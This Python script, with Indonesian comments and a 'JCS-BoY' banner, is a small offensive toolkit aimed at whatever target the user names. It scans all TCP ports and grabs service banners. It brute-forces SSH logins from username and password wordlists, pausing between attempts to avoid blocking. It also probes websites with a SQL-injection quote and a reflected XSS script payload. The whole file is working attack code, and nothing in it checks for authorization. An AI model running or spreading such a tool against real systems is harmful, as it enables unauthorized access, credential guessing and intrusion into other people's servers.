import argparse
import random
import socket
import sys
import paramiko
import requests
from datetime import datetime
from time import sleep
from colorama import Fore, init

# Inisialisasi colorama
init(autoreset=True)

# Daftar warna yang tersedia di colorama
colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]

def random_color():
    return random.choice(colors)

def show_banner():
    print(f"""{random_color()}
   ___ _____  _____           ______    __   __
  |_  /  __ \/  ___|          | ___ \   \ \ / /
    | | /  \/\ `--.   ______  | |_/ / ___\ V /
    | | |     `--. \ |______| | ___ \/ _ \\ /
/\__/ / \__/\/\__/ /          | |_/ / (_) | |  
\____/ \____/\____/           \____/ \___/\_/  
                                               
    """)


def brute_force_ssh(target, username_file, password_file):
    print(f"{random_color()}Starting brute force on {target} via SSH...")
    try:
        with open(username_file, 'r') as uf:
            usernames = uf.readlines()

        with open(password_file, 'r') as pf:
            passwords = pf.readlines()

        for username in usernames:
            username = username.strip()
            for password in passwords:
                password = password.strip()
                print(f"{random_color()}Trying {username}:{password}")
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    ssh.connect(target, port=22, username=username, password=password, timeout=5)
                    print(f"{random_color()}Success: Found credentials! {username}:{password}")
                    ssh.close()
                    return
                except paramiko.AuthenticationException:
                    print(f"{random_color()}Failed: {username}:{password}")
                except Exception as e:
                    print(f"{random_color()}Error: {e}")
                sleep(1)  # Delay between attempts to avoid being blocked
        print(f"{random_color()}Brute force attempt finished.")
    except FileNotFoundError:
        print(f"{random_color()}Username or password file not found.")
    except Exception as e:
        print(f"{random_color()}An error occurred: {e}")

def grab_banner(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        sock.connect((ip, port))
        sock.send(b"GET / HTTP/1.1\r\n\r\n")
        response = sock.recv(1024)
        sock.close()
        return response.decode(errors="ignore").strip()
    except Exception:
        return "Banner not available"

def scan(target, port_start=1, port_end=65535):
    print(f"{random_color()}Starting scan on target {target}")
    print(f"{random_color()}Scan started at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{random_color()}\nPORT\tSTATE\tBANNER")
    try:
        for port in range(port_start, port_end + 1):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((target, port))
            if result == 0:
                banner = grab_banner(target, port)
                print(f"{random_color()}{port}/tcp\topen\t{banner}")
            sock.close()
    except KeyboardInterrupt:
        print(f"{random_color()}\nScan stopped by user")
        sys.exit()
    except socket.gaierror:
        print(f"{random_color()}\nHostname could not be resolved.")
        sys.exit()
    except socket.error:
        print(f"{random_color()}\nCouldn't connect to the server.")
        sys.exit()

def auto_detect_ports(target):
    """Mendeteksi port terbuka secara otomatis"""
    print(f"\n{random_color()}Auto detecting open ports on target {target}...")
    open_ports = []
    for port in range(1, 65535):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
        sock.close()

    if open_ports:
        print(f"\n{random_color()}Open ports detected:")
        for port in open_ports:
            print(f"{random_color()}{port}/tcp open")
    else:
        print(f"\n{random_color()}No open ports detected.")

def check_vulnerabilities(target):
    print(f"{random_color()}Checking for common vulnerabilities on {target}...")

    # 1. Check for missing HTTP headers (e.g. X-Frame-Options, Strict-Transport-Security, X-XSS-Protection)
    try:
        response = requests.get(f"http://{target}")
        
        # Check X-Frame-Options
        if 'X-Frame-Options' not in response.headers:
            print(f"{random_color()}Warning: X-Frame-Options header missing! This may allow clickjacking attacks.")
        else:
            print(f"{random_color()}X-Frame-Options header found: {response.headers['X-Frame-Options']}")
        
        # Check Strict-Transport-Security
        if 'Strict-Transport-Security' not in response.headers:
            print(f"{random_color()}Warning: Strict-Transport-Security header missing! Vulnerable to downgrade attacks.")
        else:
            print(f"{random_color()}Strict-Transport-Security header found: {response.headers['Strict-Transport-Security']}")
        
        # Check X-XSS-Protection
        if 'X-XSS-Protection' not in response.headers:
            print(f"{random_color()}Warning: X-XSS-Protection header missing! Vulnerable to XSS attacks.")
        else:
            print(f"{random_color()}X-XSS-Protection header found: {response.headers['X-XSS-Protection']}")

        # 2. Check for SQL Injection vulnerability (basic test)
        sql_injection_test_url = f"http://{target}/?id=1'"
        sql_injection_response = requests.get(sql_injection_test_url)
        if "syntax" in sql_injection_response.text.lower() or "error" in sql_injection_response.text.lower():
            print(f"{random_color()}Potential SQL Injection vulnerability detected on {target}.")

        # 3. Check for Cross-Site Scripting (XSS) vulnerability (basic test)
        xss_test_payload = f"<script>alert('XSS')</script>"
        xss_test_url = f"http://{target}/?search={xss_test_payload}"
        xss_response = requests.get(xss_test_url)
        if xss_test_payload in xss_response.text:
            print(f"{random_color()}Potential XSS vulnerability detected on {target}.")
        
    except requests.exceptions.RequestException as e:
        print(f"{random_color()}Error: {e}")
    except Exception as e:
        print(f"{random_color()}An error occurred: {e}")

def main():
    # Menampilkan banner terlebih dahulu
    show_banner()

    # Setup argparse
    parser = argparse.ArgumentParser(
        description="A simple port scanner, brute force SSH tool, and vulnerability detector with color output.",
        epilog="""Examples:
  Scan port: python3 boy.py <target> <start-port>-<end-port>
  Brute force SSH: python3 boy.py <target> brute_force_ssh <username-file> <password-file>
  Deteksi Kerentanannya: python3 boy.py <target> check_vulnerabilities"""
    )
    parser.add_argument("target", help="The target IP address or domain name")
    parser.add_argument("port_range", nargs="?", help="Port range in the format <start>-<end> or -p for auto-detecting open ports")
    parser.add_argument("action", nargs="?", help="Action to perform (brute_force_ssh, check_vulnerabilities)")
    parser.add_argument("username_file", nargs="?", help="File containing usernames for brute force")
    parser.add_argument("password_file", nargs="?", help="File containing passwords for brute force")
    
    # Parse arguments
    args = parser.parse_args()

    # Jika tidak ada argumen yang diberikan, tampilkan pesan help
    if not args.target:
        parser.print_help()
        sys.exit()

    # Menambahkan aksi untuk mendeteksi kerentanannya
    if args.action == 'check_vulnerabilities':
        check_vulnerabilities(args.target)
        return

    # Brute force SSH
    if args.action == 'brute_force_ssh' and args.username_file and args.password_file:
        brute_force_ssh(args.target, args.username_file, args.password_file)
        return

    port_start, port_end = 1, 65535  # Default: Scan all ports

    # Jika user memilih untuk mendeteksi semua port yang terbuka
    if args.port_range == "-p":
        auto_detect_ports(args.target)
        return

    # Jika rentang port diberikan
    if args.port_range:
        try:
            port_range = args.port_range.split('-')
            port_start = int(port_range[0])
            port_end = int(port_range[1])
        except (ValueError, IndexError):
            print(f"{random_color()}Error: port_range harus dalam format <start>-<end> (contoh: 20-80)")
            sys.exit()

    print(f"{random_color()}Scanning target: {args.target}")
    print(f"{random_color()}Scanning ports: {port_start}-{port_end}")
    scan(args.target, port_start, port_end)
    print(f"{random_color()}\nScan completed.")

if __name__ == "__main__":
    main()

